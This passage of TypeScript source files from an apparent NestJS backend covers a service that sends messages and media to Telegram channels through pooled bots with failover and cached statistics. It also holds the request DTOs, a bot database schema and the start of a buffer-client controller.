Date(a.lastUsed).getTime() - new Date(b.lastUsed).getTime());\n        this.cache.set(`category:${bot.category}`, updatedBots);\n    }\n\n    private async sendByCategoryWithFailover<T extends any[]>(\n        category: ChannelCategory,\n        sender: (botId: string, ...args: T) => Promise<boolean>,\n        ...args: T\n    ): Promise<boolean> {\n        let availableBots = this.cache.get<BotDocument[]>(`category:${category}`);\n        if (!availableBots || availableBots.length === 0) {\n            console.warn(`Cache miss for category: ${category}`);\n            availableBots = await this.botModel\n                .find({ category })\n                .sort({ lastUsed: 'asc' })\n                .lean()\n                .exec();\n            this.cache.set(`category:${category}`, availableBots);\n            availableBots.forEach(bot => this.cache.set(`bot:${bot._id}`, bot));\n        }\n\n        if (availableBots.length === 0) {\n            console.error(`No bots found for category: ${category}`);\n            return false;\n        }\n\n        for (const bot of availableBots) {\n            const success = await sender.call(this, bot._id.toString(), ...args);\n            if (success) {\n                const updatedBot = { ...bot, lastUsed: new Date() };\n                this.cache.set(`bot:${bot._id}`, updatedBot);\n                const updatedBots = availableBots\n                    .map(b => b._id.toString() === bot._id.toString() ? updatedBot : b)\n                    .sort((a, b) => new Date(a.lastUsed).getTime() - new Date(b.lastUsed).getTime());\n                this.cache.set(`category:${category}`, updatedBots);\n                // Update lastUsed in pending stats for eventual DB flush\n                const pendingStats = this.cache.get<Record<string, Partial<Bot['stats'] & { lastUsed?: Date }>>>('pendingStats') || {};\n                pendingStats[bot._id.toString()] = pendingStats[bot._id.toString()] || {};\n                pendingStats[bot._id.toString()].lastUsed = new Date();\n                this.cache.set('pendingStats', pendingStats);\n                return true;\n            }\n            console.warn(`Sending via bot ${bot.username} for category ${category} failed. Trying next available bot.`);\n        }\n\n        console.error(`Failed to send for category ${category} after trying all ${availableBots.length} available bot(s).`);\n        return false;\n    }\n\n    async sendMessageByCategory(category: ChannelCategory, message: string, options?: SendMessageOptions, allowServiceName: boolean = true): Promise<boolean> {\n        return this.sendByCategoryWithFailover(category, this.sendMessageByBotId, message, options, allowServiceName);\n    }\n\n    async sendPhotoByCategory(category: ChannelCategory, photo: string | Buffer, options?: PhotoOptions): Promise<boolean> {\n        return this.sendByCategoryWithFailover(category, this.sendPhotoByBotId, photo, options);\n    }\n\n    async sendVideoByCategory(category: ChannelCategory, video: string | Buffer, options?: VideoOptions): Promise<boolean> {\n        return this.sendByCategoryWithFailover(category, this.sendVideoByBotId, video, options);\n    }\n\n    async sendAudioByCategory(category: ChannelCategory, audio: string | Buffer, options?: AudioOptions): Promise<boolean> {\n        return this.sendByCategoryWithFailover(category, this.sendAudioByBotId, audio, options);\n    }\n\n    async sendDocumentByCategory(category: ChannelCategory, document: string | Buffer, options?: DocumentOptions): Promise<boolean> {\n        return this.sendByCategoryWithFailover(category, this.sendDocumentByBotId, document, options);\n    }\n\n    async sendVoiceByCategory(category: ChannelCategory, voice: string | Buffer, options?: VoiceOptions): Promise<boolean> {\n        return this.sendByCategoryWithFailover(category, this.sendVoiceByBotId, voice, options);\n    }\n\n    async sendAnimationByCategory(category: ChannelCategory, animation: string | Buffer, options?: AnimationOptions): Promise<boolean> {\n        return this.sendByCategoryWithFailover(category, this.sendAnimationByBotId, animation, options);\n    }\n\n    async sendStickerByCategory(category: ChannelCategory, sticker: string | Buffer, options?: StickerOptions): Promise<boolean> {\n        return this.sendByCategoryWithFailover(category, this.sendStickerByBotId, sticker, options);\n    }\n\n    async sendMediaGroupByCategory(category: ChannelCategory, media: MediaGroupItem[], options?: MediaGroupOptions): Promise<boolean> {\n        return this.sendByCategoryWithFailover(category, this.sendMediaGroupByBotId, media, options);\n    }\n\n    async sendMessageByBotId(botId: string, message: string, options?: SendMessageOptions, allowServiceName: boolean = true): Promise<boolean> {\n        const bot = await this.getBotById(botId);\n        const success = await this.executeSendMessage(bot, message, options, allowServiceName);\n        if (success) {\n            await this.updateBotStats(botId, 'messagesSent', bot);\n        }\n        return success;\n    }\n\n    async sendPhotoByBotId(botId: string, photo: string | Buffer, options?: PhotoOptions): Promise<boolean> {\n        const bot = await this.getBotById(botId);\n        const success = await this.executeSendMedia(bot, 'sendPhoto', photo, options);\n        if (success) {\n            await this.updateBotStats(botId, 'photosSent', bot);\n        }\n        return success;\n    }\n\n    async sendVideoByBotId(botId: string, video: string | Buffer, options?: VideoOptions): Promise<boolean> {\n        const bot = await this.getBotById(botId);\n        const success = await this.executeSendMedia(bot, 'sendVideo', video, options);\n        if (success) {\n            await this.updateBotStats(botId, 'videosSent', bot);\n        }\n        return success;\n    }\n\n    async sendAudioByBotId(botId: string, audio: string | Buffer, options?: AudioOptions): Promise<boolean> {\n        const bot = await this.getBotById(botId);\n        const success = await this.executeSendMedia(bot, 'sendAudio', audio, options);\n        if (success) {\n            await this.updateBotStats(botId, 'audiosSent', bot);\n        }\n        return success;\n    }\n\n    async sendDocumentByBotId(botId: string, document: string | Buffer, options?: DocumentOptions): Promise<boolean> {\n        const bot = await this.getBotById(botId);\n        const success = await this.executeSendMedia(bot, 'sendDocument', document, options);\n        if (success) {\n            await this.updateBotStats(botId, 'documentsSent', bot);\n        }\n        return success;\n    }\n\n    async sendVoiceByBotId(botId: string, voice: string | Buffer, options?: VoiceOptions): Promise<boolean> {\n        const bot = await this.getBotById(botId);\n        const success = await this.executeSendMedia(bot, 'sendVoice', voice, options);\n        if (success) {\n            await this.updateBotStats(botId, 'voicesSent', bot);\n        }\n        return success;\n    }\n\n    async sendAnimationByBotId(botId: string, animation: string | Buffer, options?: AnimationOptions): Promise<boolean> {\n        const bot = await this.getBotById(botId);\n        const success = await this.executeSendMedia(bot, 'sendAnimation', animation, options);\n        if (success) {\n            await this.updateBotStats(botId, 'animationsSent', bot);\n        }\n        return success;\n    }\n\n    async sendStickerByBotId(botId: string, sticker: string | Buffer, options?: StickerOptions): Promise<boolean> {\n        const bot = await this.getBotById(botId);\n        const success = await this.executeSendMedia(bot, 'sendSticker', sticker, options);\n        if (success) {\n            await this.updateBotStats(botId, 'stickersSent', bot);\n        }\n        return success;\n    }\n\n    async sendMediaGroupByBotId(botId: string, media: MediaGroupItem[], options?: MediaGroupOptions): Promise<boolean> {\n        const bot = await this.getBotById(botId);\n        const success = await this.executeSendMediaGroup(bot, media, options);\n        if (success) {\n            await this.updateBotStats(botId, 'mediaGroupsSent', bot);\n        }\n        return success;\n    }\n\n    private async executeSendMessage(bot: BotDocument, text: string, options?: SendMessageOptions, allowServiceName: boolean = true): Promise<boolean> {\n        try {\n            const response = await axios.post(\n                `https://api.telegram.org/bot${bot.token}/sendMessage`,\n                {\n                    chat_id: bot.channelId,\n                    text: `${allowServiceName ? `${process.env.clientId?.toUpperCase()}\\n\\n${text}` : text}`,\n                    parse_mode: options?.parseMode,\n                    disable_web_page_preview: options?.disableWebPagePreview,\n                    disable_notification: options?.disableNotification,\n                    reply_to_message_id: options?.replyToMessageId,\n                    allow_sending_without_reply: options?.allowSendingWithoutReply,\n                    protect_content: options?.protectContent,\n                    link_preview_options: options?.linkPreviewOptions,\n                },\n                { timeout: 15000 }\n            );\n            if (!response.data?.ok) {\n                console.error(`Telegram API error for sendMessage with bot ${bot.username}:`, response.data.description);\n            }\n            return response.data?.ok === true;\n        } catch (error) {\n            parseError(error, `Failed to execute sendMessage for bot ${bot.username}`);\n            return false;\n        }\n    }\n\n    private async executeSendMedia(bot: BotDocument, method: string, media: Buffer | string, options: any = {}): Promise<boolean> {\n        const formData = new FormData();\n        formData.append('chat_id', bot.channelId);\n\n        const mediaField = method.replace('send', '').toLowerCase();\n        if (Buffer.isBuffer(media)) {\n            formData.append(mediaField, media, `${mediaField}.${this.getDefaultExtension(mediaField)}`);\n        } else {\n            formData.append(mediaField, media);\n        }\n\n        if (options.caption) {\n            formData.append('caption', `${process.env.clientId?.toUpperCase()}:\\n\\n${options.caption}`);\n        }\n        if (options.parseMode) formData.append('parse_mode', options.parseMode);\n        if (options.disableNotification) formData.append('disable_notification', 'true');\n        if (options.replyToMessageId) formData.append('reply_to_message_id', options.replyToMessageId.toString());\n        if (options.allowSendingWithoutReply) formData.append('allow_sending_without_reply', 'true');\n        if (options.protectContent) formData.append('protect_content', 'true');\n        if (options.hasSpoiler) formData.append('has_spoiler', 'true');\n\n        this.addMethodSpecificOptions(method, options, formData);\n\n        try {\n            const response = await axios.post(\n                `https://api.telegram.org/bot${bot.token}/${method}`,\n                formData,\n                { timeout: 30000, headers: formData.getHeaders() }\n            );\n            if (!response.data?.ok) {\n                console.error(`Telegram API error for ${method} with bot ${bot.username}:`, response.data.description);\n            }\n            return response.data?.ok === true;\n        } catch (error) {\n            parseError(error, `Failed to execute ${method} for bot ${bot.username}`);\n            return false;\n        }\n    }\n\n    private async executeSendMediaGroup(bot: BotDocument, media: MediaGroupItem[], options?: MediaGroupOptions): Promise<boolean> {\n        const formData = new FormData();\n        formData.append('chat_id', bot.channelId);\n\n        const mediaArray = media.map((item, i) => {\n            const mediaObj: any = {\n                type: item.type,\n                media: Buffer.isBuffer(item.media) ? `attach://file${i}` : item.media,\n            };\n            if (item.caption) mediaObj.caption = `${process.env.clientId?.toUpperCase()}:\\n\\n${item.caption}`;\n            if (item.parseMode) mediaObj.parse_mode = item.parseMode;\n            if (item.hasSpoiler) mediaObj.has_spoiler = true;\n            if (item.type === 'video') {\n                if (item.duration) mediaObj.duration = item.duration;\n                if (item.width) mediaObj.width = item.width;\n                if (item.height) mediaObj.height = item.height;\n                if (item.supportsStreaming) mediaObj.supports_streaming = true;\n            }\n            if (item.type === 'audio') {\n                if (item.duration) mediaObj.duration = item.duration;\n                if (item.performer) mediaObj.performer = item.performer;\n                if (item.title) mediaObj.title = item.title;\n            }\n            if (Buffer.isBuffer(item.media)) {\n                const filename = item.extension ? `file${i}.${item.extension}` : `file${i}.${this.getDefaultExtension(item.type)}`;\n                formData.append(`file${i}`, item.media, filename);\n            }\n            if (item.thumbnail && Buffer.isBuffer(item.thumbnail)) {\n                mediaObj.thumbnail = `attach://thumb${i}`;\n                formData.append(`thumb${i}`, item.thumbnail, `thumb${i}.jpg`);\n            }\n            return mediaObj;\n        });\n\n        formData.append('media', JSON.stringify(mediaArray));\n        if (options) {\n            if (options.disableNotification) formData.append('disable_notification', 'true');\n            if (options.replyToMessageId) formData.append('reply_to_message_id', options.replyToMessageId.toString());\n            if (options.allowSendingWithoutReply) formData.append('allow_sending_without_reply', 'true');\n            if (options.protectContent) formData.append('protect_content', 'true');\n        }\n\n        try {\n            const response = await axios.post(\n                `https://api.telegram.org/bot${bot.token}/sendMediaGroup`,\n                formData,\n                { timeout: 30000, headers: formData.getHeaders() }\n            );\n            if (!response.data?.ok) {\n                console.error(`Telegram API error for sendMediaGroup with bot ${bot.username}:`, response.data.description);\n            }\n            return response.data?.ok === true;\n        } catch (error) {\n            parseError(error, `Failed to execute sendMediaGroup for bot ${bot.username}`);\n            return false;\n        }\n    }\n\n    private async fetchUsername(token: string): Promise<string> {\n        if (!token || typeof token !== 'string' || token.length < 10) {\n            return '';\n        }\n\n        try {\n            const res = await axios.get(`https://api.telegram.org/bot${token}/getMe`, {\n                timeout: 10000\n            });\n            return res.data?.ok ? res.data.result.username : '';\n        } catch (error) {\n            console.error('Error fetching bot username with provided token:', error);\n            parseError(error, 'Failed fetching bot username:');\n            return '';\n        }\n    }\n\n    private async updateBotStats(botId: string, statField: keyof Bot['stats'], bot: BotDocument): Promise<void> {\n        // Update in-memory bot stats\n        const updatedBot = {\n            ...bot,\n            stats: {\n                ...bot.stats,\n                [statField]: bot.stats[statField] + 1,\n            },\n            lastUsed: new Date(),\n        };\n\n        // Update bot cache\n        this.cache.set(`bot:${botId}`, updatedBot);\n\n        // Update category cache\n        const cachedBots = this.cache.get<BotDocument[]>(`category:${bot.category}`) || [];\n        const updatedBots = cachedBots\n            .map(b => b._id.toString() === botId ? updatedBot : b)\n            .sort((a, b) => new Date(a.lastUsed).getTime() - new Date(b.lastUsed).getTime());\n        this.cache.set(`category:${bot.category}`, updatedBots);\n\n        // Add to pending stats updates\n        const pendingStats = this.cache.get<Record<string, Partial<Bot['stats'] & { lastUsed?: Date }>>>('pendingStats') || {};\n        pendingStats[botId] = pendingStats[botId] || {};\n        pendingStats[botId][statField] = (pendingStats[botId][statField] || 0) + 1;\n        pendingStats[botId].lastUsed = updatedBot.lastUsed;\n\n        this.cache.set('pendingStats', pendingStats);\n\n        // Flush immediately if too many pending updates\n        if (Object.keys(pendingStats).length >= this.maxPendingUpdates) {\n            await this.flushPendingStats();\n        }\n    }\n\n    private getDefaultExtension(type: string): string {\n        switch (type) {\n            case 'photo': return 'jpg';\n            case 'video': return 'mp4';\n            case 'audio': return 'mp3';\n            case 'document': return 'bin';\n            default: return 'dat';\n        }\n    }\n\n    private addMethodSpecificOptions(method: string, options: any, formData: FormData): void {\n        if (method === 'sendVideo' || method === 'sendAnimation') {\n            if (options.duration) formData.append('duration', options.duration.toString());\n            if (options.width) formData.append('width', options.width.toString());\n            if (options.height) formData.append('height', options.height.toString());\n            if (options.supportsStreaming) formData.append('supports_streaming', 'true');\n        }\n        if (method === 'sendAudio') {\n            if (options.duration) formData.append('duration', options.duration.toString());\n            if (options.performer) formData.append('performer', options.performer);\n            if (options.title) formData.append('title', options.title);\n        }\n        if (options.thumbnail) {\n            if (Buffer.isBuffer(options.thumbnail)) {\n                formData.append('thumbnail', options.thumbnail, 'thumbnail.jpg');\n            } else {\n                formData.append('thumbnail', options.thumbnail);\n            }\n        }\n        if (method === 'sendDocument' && options.disableContentTypeDetection) {\n            formData.append('disable_content_type_detection', 'true');\n        }\n        if (method === 'sendVoice' || method === 'sendVideoNote') {\n            if (options.duration) formData.append('duration', options.duration.toString());\n        }\n        if (method === 'sendVideoNote' && options.length) {\n            formData.append('length', options.length.toString());\n        }\n        if (method === 'sendSticker' && options.emoji) {\n            formData.append('emoji', options.emoji);\n        }\n    }\n\n    async getBotStatsByCategory(category: ChannelCategory): Promise<any> {\n        const cacheKey = `stats:${category}`;\n        const cachedStats = this.cache.get<any>(cacheKey);\n        if (cachedStats) {\n            return cachedStats;\n        }\n        console.warn(`Cache miss for stats: ${category}`);\n        const stats = await this.botModel.aggregate([\n            { $match: { category } },\n            {\n                $group: {\n                    _id: '$category',\n                    totalBots: { $sum: 1 },\n                    totalMessagesSent: { $sum: '$stats.messagesSent' },\n                    totalPhotosSent: { $sum: '$stats.photosSent' },\n                    totalVideosSent: { $sum: '$stats.videosSent' },\n                    totalDocumentsSent: { $sum: '$stats.documentsSent' },\n                    totalAudiosSent: { $sum: '$stats.audiosSent' },\n                    totalMediaGroupsSent: { $sum: '$stats.mediaGroupsSent' },\n                    avgFailedAttempts: { $avg: '$failedAttempts' }\n                }\n            }\n        ]);\n        const result = stats[0] || { _id: category, totalBots: 0 };\n        this.cache.set(cacheKey, result);\n        return result;\n    }\n}","import { ApiProperty } from '@nestjs/swagger';\nimport { IsString, IsEnum, IsOptional } from 'class-validator';\nimport { ChannelCategory } from '../bots.service';\n\nexport class CreateBotDto {\n    @ApiProperty({\n        description: 'Telegram bot token',\n        example: '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz'\n    })\n    @IsString()\n    token: string;\n\n    @ApiProperty({\n        description: 'Channel category the bot belongs to',\n        enum: ChannelCategory,\n        example: ChannelCategory.CLIENT_UPDATES\n    })\n    @IsEnum(ChannelCategory)\n    category: ChannelCategory;\n\n    @ApiProperty({\n        description: 'Channel ID where bot will post messages',\n        example: '-1001234567890'\n    })\n    @IsString()\n    channelId: string;\n\n    @ApiProperty({\n        description: 'Optional description of the bot',\n        required: false,\n        example: 'Bot for sending client updates'\n    })\n    @IsString()\n    @IsOptional()\n    description?: string;\n}\n","export * from './create-bot.dto';\nexport * from './send-message.dto';\nexport * from './media.dto';\nexport * from './media-extras.dto';\nexport * from './media-group.dto';","import { ApiProperty } from '@nestjs/swagger';\nimport { IsString, IsNumber, IsOptional, ValidateNested } from 'class-validator';\nimport { Type } from 'class-transformer';\nimport { MediaOptionsDto } from './media.dto';\n\nexport class VoiceOptionsDto extends MediaOptionsDto {\n  @ApiProperty({\n    description: 'Duration of the voice message in seconds',\n    required: false,\n  })\n  @IsNumber()\n  @IsOptional()\n  duration?: number;\n}\n\nexport class SendVoiceDto {\n  @ApiProperty({\n    description: 'Voice message URL or file ID',\n    example: 'https://example.com/voice.ogg',\n  })\n  @IsString()\n  voice: string;\n\n  @ApiProperty({\n    description: 'Voice sending options',\n    required: false,\n    type: () => VoiceOptionsDto,\n  })\n  @IsOptional()\n  @ValidateNested()\n  @Type(() => VoiceOptionsDto)\n  options?: VoiceOptionsDto;\n}\n\nexport class AnimationOptionsDto extends MediaOptionsDto {\n  @ApiProperty({ description: 'Duration of the animation in seconds', required: false })\n  @IsNumber()\n  @IsOptional()\n  duration?: number;\n\n  @ApiProperty({ description: 'Animation width', required: false })\n  @IsNumber()\n  @IsOptional()\n  width?: number;\n\n  @ApiProperty({ description: 'Animation height', required: false })\n  @IsNumber()\n  @IsOptional()\n  height?: number;\n}\n\nexport class SendAnimationDto {\n  @ApiProperty({\n    description: 'Animation (GIF/MP4) URL or file ID',\n    example: 'https://example.com/animation.gif',\n  })\n  @IsString()\n  animation: string;\n\n  @ApiProperty({\n    description: 'Animation sending options',\n    required: false,\n    type: () => AnimationOptionsDto,\n  })\n  @IsOptional()\n  @ValidateNested()\n  @Type(() => AnimationOptionsDto)\n  options?: AnimationOptionsDto;\n}\n\nexport class StickerOptionsDto extends MediaOptionsDto {\n  @ApiProperty({\n    description: 'Emoji associated with the sticker',\n    required: false,\n    example: '',\n  })\n  @IsString()\n  @IsOptional()\n  emoji?: string;\n}\n\nexport class SendStickerDto {\n  @ApiProperty({\n    description: 'Sticker URL or file ID',\n    example: 'https://example.com/sticker.webp',\n  })\n  @IsString()\n  sticker: string;\n\n  @ApiProperty({\n    description: 'Sticker sending options',\n    required: false,\n    type: () => StickerOptionsDto,\n  })\n  @IsOptional()\n  @ValidateNested()\n  @Type(() => StickerOptionsDto)\n  options?: StickerOptionsDto;\n}\n","import { ApiProperty } from '@nestjs/swagger';\nimport { IsString, IsArray, IsEnum, IsOptional, ValidateNested } from 'class-validator';\nimport { Type } from 'class-transformer';\nimport { MediaOptionsDto } from './media.dto';\n\nexport class MediaGroupItemDto {\n    @ApiProperty({\n        description: 'Type of media',\n        enum: ['photo', 'video', 'audio', 'document'],\n        example: 'photo'\n    })\n    @IsEnum(['photo', 'video', 'audio', 'document'])\n    type: 'photo' | 'video' | 'audio' | 'document';\n\n    @ApiProperty({\n        description: 'Media URL or file ID',\n        example: 'https://example.com/media.jpg'\n    })\n    @IsString()\n    media: string;\n\n    @ApiProperty({\n        description: 'Caption for the media',\n        required: false\n    })\n    @IsString()\n    @IsOptional()\n    caption?: string;\n\n    @ApiProperty({\n        description: 'Parse mode for caption',\n        enum: ['HTML', 'Markdown', 'MarkdownV2'],\n        required: false\n    })\n    @IsString()\n    @IsOptional()\n    parseMode?: 'HTML' | 'Markdown' | 'MarkdownV2';\n\n    @ApiProperty({\n        description: 'Apply spoiler animation to media',\n        required: false\n    })\n    @IsOptional()\n    hasSpoiler?: boolean;\n\n    @ApiProperty({\n        description: 'File extension when sending as buffer',\n        required: false\n    })\n    @IsString()\n    @IsOptional()\n    extension?: string;\n\n    @ApiProperty({\n        description: 'Duration for video/audio in seconds',\n        required: false\n    })\n    @IsOptional()\n    duration?: number;\n\n    @ApiProperty({\n        description: 'Width for video',\n        required: false\n    })\n    @IsOptional()\n    width?: number;\n\n    @ApiProperty({\n        description: 'Height for video',\n        required: false\n    })\n    @IsOptional()\n    height?: number;\n\n    @ApiProperty({\n        description: 'Whether video supports streaming',\n        required: false\n    })\n    @IsOptional()\n    supportsStreaming?: boolean;\n\n    @ApiProperty({\n        description: 'Performer name for audio',\n        required: false\n    })\n    @IsString()\n    @IsOptional()\n    performer?: string;\n\n    @ApiProperty({\n        description: 'Title for audio',\n        required: false\n    })\n    @IsString()\n    @IsOptional()\n    title?: string;\n}\n\nexport class SendMediaGroupDto {\n    @ApiProperty({\n        description: 'Array of media items to send',\n        type: [MediaGroupItemDto]\n    })\n    @IsArray()\n    @ValidateNested({ each: true })\n    @Type(() => MediaGroupItemDto)\n    media: MediaGroupItemDto[];\n\n    @ApiProperty({\n        description: 'Media group sending options',\n        required: false,\n        type: () => MediaOptionsDto\n    })\n    @IsOptional()\n    @ValidateNested()\n    @Type(() => MediaOptionsDto)\n    options?: MediaOptionsDto;\n}\n","import { ApiProperty } from '@nestjs/swagger';\nimport { IsString, IsNumber, IsBoolean, IsOptional, ValidateNested } from 'class-validator';\nimport { Type } from 'class-transformer';\n\n// Base class for shared media options\nexport class MediaOptionsDto {\n    @ApiProperty({\n        description: 'Parse mode for the caption',\n        enum: ['HTML', 'MarkdownV2', 'Markdown'],\n        required: false\n    })\n    @IsString()\n    @IsOptional()\n    parseMode?: 'HTML' | 'MarkdownV2' | 'Markdown';\n\n    @ApiProperty({\n        description: 'Caption text',\n        required: false\n    })\n    @IsString()\n    @IsOptional()\n    caption?: string;\n\n    @ApiProperty({\n        description: 'Disable notification',\n        required: false\n    })\n    @IsBoolean()\n    @IsOptional()\n    disableNotification?: boolean;\n\n    @ApiProperty({\n        description: 'Message ID to reply to',\n        required: false\n    })\n    @IsNumber()\n    @IsOptional()\n    replyToMessageId?: number;\n\n    @ApiProperty({\n        description: 'Allow sending without reply',\n        required: false\n    })\n    @IsBoolean()\n    @IsOptional()\n    allowSendingWithoutReply?: boolean;\n\n    @ApiProperty({\n        description: 'Protect content',\n        required: false\n    })\n    @IsBoolean()\n    @IsOptional()\n    protectContent?: boolean;\n\n    @ApiProperty({\n        description: 'Apply spoiler animation',\n        required: false\n    })\n    @IsBoolean()\n    @IsOptional()\n    hasSpoiler?: boolean;\n}\n\n// Video options, extends MediaOptionsDto\nexport class VideoOptionsDto extends MediaOptionsDto {\n    @ApiProperty({\n        description: 'Duration of the video in seconds',\n        required: false\n    })\n    @IsNumber()\n    @IsOptional()\n    duration?: number;\n\n    @ApiProperty({\n        description: 'Video width',\n        required: false\n    })\n    @IsNumber()\n    @IsOptional()\n    width?: number;\n\n    @ApiProperty({\n        description: 'Video height',\n        required: false\n    })\n    @IsNumber()\n    @IsOptional()\n    height?: number;\n\n    @ApiProperty({\n        description: 'Pass True if the uploaded video is suitable for streaming',\n        required: false\n    })\n    @IsBoolean()\n    @IsOptional()\n    supportsStreaming?: boolean;\n}\n\n// Audio options, extends MediaOptionsDto\nexport class AudioOptionsDto extends MediaOptionsDto {\n    @ApiProperty({\n        description: 'Duration of the audio in seconds',\n        required: false\n    })\n    @IsNumber()\n    @IsOptional()\n    duration?: number;\n\n    @ApiProperty({\n        description: 'Performer name',\n        required: false\n    })\n    @IsString()\n    @IsOptional()\n    performer?: string;\n\n    @ApiProperty({\n        description: 'Track title',\n        required: false\n    })\n    @IsString()\n    @IsOptional()\n    title?: string;\n}\n\n// Document options, extends MediaOptionsDto\nexport class DocumentOptionsDto extends MediaOptionsDto {\n    @ApiProperty({\n        description: 'Disables automatic content type detection',\n        required: false\n    })\n    @IsBoolean()\n    @IsOptional()\n    disableContentTypeDetection?: boolean;\n}\n\n// DTO for sending photos\nexport class SendPhotoDto {\n    @ApiProperty({\n        description: 'Photo URL or file ID',\n        example: 'https://example.com/photo.jpg'\n    })\n    @IsString()\n    photo: string;\n\n    @ApiProperty({\n        description: 'Photo sending options',\n        required: false,\n        type: () => MediaOptionsDto\n    })\n    @IsOptional()\n    @ValidateNested()\n    @Type(() => MediaOptionsDto)\n    options?: MediaOptionsDto;\n}\n\n// DTO for sending videos\nexport class SendVideoDto {\n    @ApiProperty({\n        description: 'Video URL or file ID',\n        example: 'https://example.com/video.mp4'\n    })\n    @IsString()\n    video: string;\n\n    @ApiProperty({\n        description: 'Video sending options',\n        required: false,\n        type: () => VideoOptionsDto\n    })\n    @IsOptional()\n    @ValidateNested()\n    @Type(() => VideoOptionsDto)\n    options?: VideoOptionsDto;\n}\n\n// DTO for sending audio\nexport class SendAudioDto {\n    @ApiProperty({\n        description: 'Audio URL or file ID',\n        example: 'https://example.com/audio.mp3'\n    })\n    @IsString()\n    audio: string;\n\n    @ApiProperty({\n        description: 'Audio sending options',\n        required: false,\n        type: () => AudioOptionsDto\n    })\n    @IsOptional()\n    @ValidateNested()\n    @Type(() => AudioOptionsDto)\n    options?: AudioOptionsDto;\n}\n\n// DTO for sending documents\nexport class SendDocumentDto {\n    @ApiProperty({\n        description: 'Document URL or file ID',\n        example: 'https://example.com/document.pdf'\n    })\n    @IsString()\n    document: string;\n\n    @ApiProperty({\n        description: 'Document sending options',\n        required: false,\n        type: () => DocumentOptionsDto\n    })\n    @IsOptional()\n    @ValidateNested()\n    @Type(() => DocumentOptionsDto)\n    options?: DocumentOptionsDto;\n}","import { ApiProperty } from '@nestjs/swagger';\nimport { IsString, IsBoolean, IsNumber, IsOptional, ValidateNested, IsObject } from 'class-validator';\nimport { Type } from 'class-transformer';\n\nexport class LinkPreviewOptionsDto {\n    @ApiProperty({\n        description: 'Disables link preview',\n        required: false\n    })\n    @IsBoolean()\n    @IsOptional()\n    isDisabled?: boolean;\n\n    @ApiProperty({\n        description: 'URL to use for the link preview',\n        required: false\n    })\n    @IsString()\n    @IsOptional()\n    url?: string;\n\n    @ApiProperty({\n        description: 'Prefer small media',\n        required: false\n    })\n    @IsBoolean()\n    @IsOptional()\n    preferSmallMedia?: boolean;\n\n    @ApiProperty({\n        description: 'Prefer large media',\n        required: false\n    })\n    @IsBoolean()\n    @IsOptional()\n    preferLargeMedia?: boolean;\n\n    @ApiProperty({\n        description: 'Show preview above text',\n        required: false\n    })\n    @IsBoolean()\n    @IsOptional()\n    showAboveText?: boolean;\n}\n\n\nexport class SendMessageOptionsDto {\n    @ApiProperty({\n        description: 'Parse mode for the message',\n        enum: ['HTML', 'MarkdownV2', 'Markdown'],\n        required: false\n    })\n    @IsString()\n    @IsOptional()\n    parseMode?: 'HTML' | 'MarkdownV2' | 'Markdown';\n\n    @ApiProperty({\n        description: 'Disable web page preview',\n        required: false\n    })\n    @IsBoolean()\n    @IsOptional()\n    disableWebPagePreview?: boolean;\n\n    @ApiProperty({\n        description: 'Disable notification',\n        required: false\n    })\n    @IsBoolean()\n    @IsOptional()\n    disableNotification?: boolean;\n\n    @ApiProperty({\n        description: 'Message ID to reply to',\n        required: false\n    })\n    @IsNumber()\n    @IsOptional()\n    replyToMessageId?: number;\n\n    @ApiProperty({\n        description: 'Allow sending without reply',\n        required: false\n    })\n    @IsBoolean()\n    @IsOptional()\n    allowSendingWithoutReply?: boolean;\n\n    @ApiProperty({\n        description: 'Protect content',\n        required: false\n    })\n    @IsBoolean()\n    @IsOptional()\n    protectContent?: boolean;\n\n    @ApiProperty({\n        description: 'Link preview options',\n        required: false,\n        type: () => LinkPreviewOptionsDto\n    })\n    @IsOptional()\n    @ValidateNested()\n    @Type(() => LinkPreviewOptionsDto)\n    linkPreviewOptions?: LinkPreviewOptionsDto;\n}\n\nexport class SendMessageDto {\n    @ApiProperty({\n        description: 'Message text to send',\n        example: 'Hello, this is a test message!'\n    })\n    @IsString()\n    message: string;\n\n    @ApiProperty({\n        description: 'Message sending options',\n        required: false,\n        type: () => SendMessageOptionsDto\n    })\n    @IsOptional()\n    @ValidateNested()\n    @Type(() => SendMessageOptionsDto)\n    options?: SendMessageOptionsDto;\n}\n\n","export * from './bots.controller';\nexport * from './bots.module';\nexport * from './bots.service';\nexport * from './dto';\nexport * from './schemas';","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\nimport { ChannelCategory } from '../bots.service';\nimport { ApiProperty } from '@nestjs/swagger';\n\nexport type BotDocument = Bot & Document;\n\n@Schema({ timestamps: true })\nexport class Bot {\n  @ApiProperty()\n  @Prop({ required: true })\n  token: string;\n\n  @ApiProperty()\n  @Prop({ required: true })\n  username: string;\n\n  @ApiProperty({ enum: ChannelCategory })\n  @Prop({ required: true, enum: ChannelCategory })\n  category: ChannelCategory;\n\n  @ApiProperty()\n  @Prop({ required: true })\n  channelId: string;\n\n  @ApiProperty({ required: false })\n  @Prop()\n  description?: string;\n\n  @ApiProperty()\n  @Prop({ default: Date.now })\n  lastUsed: Date;\n\n  @ApiProperty()\n  @Prop({ type: Object })\n  stats: {\n    messagesSent: number;\n    photosSent: number;\n    videosSent: number;\n    documentsSent: number;\n    audiosSent: number;\n    voicesSent: number;\n    animationsSent: number;\n    stickersSent: number;\n    mediaGroupsSent: number;\n  };\n}\n\nexport const BotSchema = SchemaFactory.createForClass(Bot);\n","export * from './bot.schema';","import { Controller, Get, Post, Body, Param, Delete, Query, Patch, Put, BadRequestException } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody, ApiParam, ApiQuery, ApiResponse } from '@nestjs/swagger';\nimport { BufferClientService } from './buffer-client.service';\nimport { CreateBufferClientDto } from './dto/create-buffer-client.dto';\nimport { SearchBufferClientDto } from './dto/search-buffer-client.dto';\nimport { BufferClient } from './schemas/buffer-client.schema';\nimport { UpdateBufferClientDto } from './dto/update-buffer-client.dto';\n\n@ApiTags('Buffer Clients')\n@Controller('bufferclients')\nexport class BufferClientController {\n  constructor(private readonly clientService: BufferClientService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create user data' })\n  @ApiBody({ type: CreateBufferClientDto })\n  @ApiResponse({ type: BufferClient })\n  async create(@Body() createClientDto: CreateBufferClientDto): Promise<BufferClient> {\n    return this.clientService.create(createClientDto);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search buffer client data' })\n  @ApiQuery({ name: 'mobile', required: false, description: 'Mobile number' })\n  @ApiQuery({ name: 'clientId', required: false, description: 'Client ID' })\n  @ApiQuery({ name: 